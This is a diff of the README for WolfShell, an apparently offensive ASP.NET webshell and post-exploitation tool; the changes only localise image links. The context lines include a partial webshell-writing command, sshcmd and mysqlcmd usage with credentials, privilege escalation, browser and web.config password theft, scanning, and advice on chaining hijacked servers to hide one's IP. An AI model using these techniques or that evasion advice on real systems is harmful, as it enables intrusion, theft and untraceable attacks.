@@ -1,5 +1,5 @@
 
-![WolfShell](http://www.18k.icu/img/wolfshell/wolf.png)
+![WolfShell](img/wolfshell/wolf.png)
 
 [![Author](https://img.shields.io/badge/Author-0x7556-blueviolet)](https://github.com/0x7556) 
 [![WolfShell](https://img.shields.io/badge/WolfShell-Bin-ff69b4)](https://github.com/0x7556/wolfshell/releases) 
@@ -117,12 +117,12 @@ echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Cou
 ### 自定义.NET程序执行
 
 .NET程序执行： 支持内存加载执行自定义.NET程序集，快速扩展后渗透能力。
-![exeloader](http://www.18k.icu/img/wolfshell/ExeLoader.png)
+![exeloader](img/wolfshell/ExeLoader.png)
 
 ### AI人工智能
 
 使用AI兔杀金刚狼 WebShell 服务端
-![aicode](http://www.18k.icu/img/wolfshell/aicode.png)
+![aicode](img/wolfshell/aicode.png)
 
 ### 级联内网第3层WebShell 执行Cmd命令 
 
@@ -130,18 +130,18 @@ echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Cou
 
 PS: 当然也可级联外网，比如抓了一些服务器当跳板，真正要搞的目标在第3层，这样就很难被追踪或溯源到你的真实IP了
 
-![CmdShell示例](http://www.18k.icu/img/wolfshell/Lan2CmdShell.png)
+![CmdShell示例](img/wolfshell/Lan2CmdShell.png)
 
 ### 级联内网第2层WebShell 执行Cmd命令
 
 通过入口点 192.168.50.159 级联内网 192.168.50.106 WebShell执行命令
 
-![CmdShell示例](http://www.18k.icu/img/wolfshell/LanCmdShell.png)
+![CmdShell示例](img/wolfshell/LanCmdShell.png)
 
 
 ### WebShell入口点 执行Cmd命
 
-![CmdShell示例](http://www.18k.icu/img/wolfshell/CmdShell.png)
+![CmdShell示例](img/wolfshell/CmdShell.png)
 
 ### WebShell入口点 执行PowerShell命令/代码
 * whoami代码实现非系统whoami
@@ -175,12 +175,12 @@ Current User:
 WIN-021V7TK43N5$
 ```
 
-![PowerShell示例](http://www.18k.icu/img/wolfshell/PowerShell.png)
+![PowerShell示例](img/wolfshell/PowerShell.png)
 
 
 ### 文件管理
 
-![FileMgr](http://www.18k.icu/img/wolfshell/FileMgr.png)
+![FileMgr](img/wolfshell/FileMgr.png)
 
 
 ### C#代码执行
@@ -208,7 +208,7 @@ return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Valida
 
 ```
 
-![C#代码示例](http://www.18k.icu/img/wolfshell/CodeViewKey.png)
+![C#代码示例](img/wolfshell/CodeViewKey.png)
 
 #### 扫描C段存活主机 示例代码
 ```csharp
@@ -254,7 +254,7 @@ return iplist.ToString();
 ```
 
 
-![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCping.png)
+![C#代码示例](img/wolfshell/CodeCping.png)
 
 
 
@@ -290,7 +290,7 @@ return "Error occurred: " + ex.Message;
 
 ```
 
-![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCmd.png)
+![C#代码示例](img/wolfshell/CodeCmd.png)
 
 
 #### 获取web.config密码 示例代码
@@ -334,7 +334,7 @@ return "Error occurred: " + ex.Message;
 
 ```
 
-![C#代码示例](http://www.18k.icu/img/wolfshell/CodeWebConfig.png)
+![C#代码示例](img/wolfshell/CodeWebConfig.png)
 
 
 ###  加密解密算法
@@ -344,19 +344,19 @@ return "Error occurred: " + ex.Message;
 
 #### 金刚狼密码
 
-![WolfHash](http://www.18k.icu/img/wolfshell/WolfHash.png)
+![WolfHash](img/wolfshell/WolfHash.png)
 
 #### ASCII码加密
 
-![WolfShell](http://www.18k.icu/img/wolfshell/ascii.png)
+![WolfShell](img/wolfshell/ascii.png)
 
 #### BASE64解密
 
-![WolfShell](http://www.18k.icu/img/wolfshell/unBase64.png)
+![WolfShell](img/wolfshell/unBase64.png)
 
 #### HEX十六进制解密
 
-![WolfShell](http://www.18k.icu/img/wolfshell/unhex.png)
+![WolfShell](img/wolfshell/unhex.png)
 
 
 
@@ -364,25 +364,25 @@ return "Error occurred: " + ex.Message;
 
 #### efspotato提权
 
-![EfsPotato示例](http://www.18k.icu/img/wolfshell/EfsPotato.png)
+![EfsPotato示例](img/wolfshell/EfsPotato.png)
 
 #### badpotato提权
 
 
-![BadPotato示例](http://www.18k.icu/img/wolfshell/BadPotato.png)
+![BadPotato示例](img/wolfshell/BadPotato.png)
 
 ### 内网扫描示例
 
-![NetScan示例](http://www.18k.icu/img/wolfshell/NetScan.png)
+![NetScan示例](img/wolfshell/NetScan.png)
 
 ### 端口转发示例
 
-![端口转发示例](http://www.18k.icu/img/wolfshell/PortTran.png)
+![端口转发示例](img/wolfshell/PortTran.png)
 
 
 ### HTTP代理示例
 
-![端口转发示例](http://www.18k.icu/img/wolfshell/Suo5Tunnel.png)
+![端口转发示例](img/wolfshell/Suo5Tunnel.png)
 
 ## Hacking后渗透
 
@@ -400,7 +400,7 @@ sshcmd 192.168.50.128 22 root toor download2 /tmp/down.rar c:\down.rar
 sshcmd 192.168.50.128 22 root toor upload2 c:\upload.rar /tmp/upload.rar
 ```
 
-![Hacking](http://www.18k.icu/img/wolfshell/sshcmd.png)
+![Hacking](img/wolfshell/sshcmd.png)
 
 ### Mysql数据库连接示例
 
@@ -415,7 +415,7 @@ mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT 3+5 ""
 mysqlcmd 192.168.50.139 3306 root WolfShell mysql c2VsZWN0IDMrNQ==";
 ```
 
-![Hacking](http://www.18k.icu/img/wolfshell/mysqlcmd.png)
+![Hacking](img/wolfshell/mysqlcmd.png)
 
 ### 读取浏览器密码示例
 
@@ -441,7 +441,7 @@ Demo:
 =======================================================================
 ```
 
-![Hacking](http://www.18k.icu/img/wolfshell/SharpWeb.png)
+![Hacking](img/wolfshell/SharpWeb.png)
 
 ### Ladon内网渗透工具示例
 20251106 主要集成以下探测功能，其它功能暂未支持
@@ -479,10 +479,10 @@ Ladon 192.168.50.159/24 DnsInfo      DNS存活主机探测、域名识别
 ```
 
 #### SMB协议NTLM信息OS操作系统识别
-![Hacking](http://www.18k.icu/img/wolfshell/SmbInfo.png)
+![Hacking](img/wolfshell/SmbInfo.png)
 
 #### WebScan 网站标题、中间件扫描
-![Hacking](http://www.18k.icu/img/wolfshell/WebScan.png)
+![Hacking](img/wolfshell/WebScan.png)
 
 
 ### 端口扫描 示例
@@ -495,34 +495,34 @@ PortScan 192.168.50.159 80，22，135，445
 
 ```
 
-![Hacking](http://www.18k.icu/img/wolfshell/PortScan.png)
+![Hacking](img/wolfshell/PortScan.png)
 
 ## MS17010 漏洞检测
 
-![WolfShell](http://www.18k.icu/img/wolfshell/ms17010.png)
+![WolfShell](img/wolfshell/ms17010.png)
 
 
 ## SQL Server横向移动 数据库提权
 
-![WolfShell](http://www.18k.icu/img/wolfshell/MssqlCmd.png)
+![WolfShell](img/wolfshell/MssqlCmd.png)
 
 
 ## Xshell密码读取
 
-![WolfShell](http://www.18k.icu/img/wolfshell/XshellPwd.png)
+![WolfShell](img/wolfshell/XshellPwd.png)
 
 
 ## webkey 密码读取
 
 解析web.config 获取ValidationKey (ViewState反序列化 Exchange、SharePoint后门)
 
-![WolfShell](http://www.18k.icu/img/wolfshell/webkey.png)
+![WolfShell](img/wolfshell/webkey.png)
 
 ## CVE-2025-55182 Next.js Rce 漏洞利用
 [+]CVE-2025-55182	CVE-2025-55182 Next.js Rce 漏洞利用
 [+]NextJSexp		CVE-2025-55182 Next.js Rce 漏洞利用
 
-![WolfShell](http://www.18k.icu/img/wolfshell/nextjsexp.png)
+![WolfShell](img/wolfshell/nextjsexp.png)
 
 ## 免责声明
 
@@ -553,4 +553,4 @@ PortScan 192.168.50.159 80，22，135，445
 
 * 欢迎大家关注公众号和Github，您的关注、点赞、反馈，将是软件更新的动力来源!
   
-![WolfShell](http://www.18k.icu/img/join.png)
+![WolfShell](img/join.png)
